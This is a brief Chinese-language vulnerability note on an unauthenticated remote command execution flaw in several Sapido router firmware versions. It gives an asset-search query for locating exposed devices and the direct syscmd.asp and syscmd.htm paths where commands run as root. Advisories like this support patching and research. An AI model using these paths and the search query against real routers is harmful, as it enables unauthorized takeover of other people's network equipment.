# Sapido 多款路由器 远程命令执行漏洞

## 漏洞描述

Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令

## 漏洞影响

<a-checkbox checked>BR270n-v2.1.03</a-checkbox></br>

<a-checkbox checked>BRC76n-v2.1.03</a-checkbox></br>

<a-checkbox checked>GR297-v2.1.3</a-checkbox></br>

<a-checkbox checked>RB1732-v2.0.43</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Sapido-路由器"</a-checkbox></br>

## 漏洞复现

固件中存在一个asp文件为 `syscmd.asp` 存在命令执行



![img](../../../.vuepress/public/img/sa-1.png)



访问目标:



```plain
http://xxx.xxx.xxx.xxx/syscmd.asp
http://xxx.xxx.xxx.xxx/syscmd.htm
```



![img](../../../.vuepress/public/img/sa-2.png)



直接输入就可以命令执行了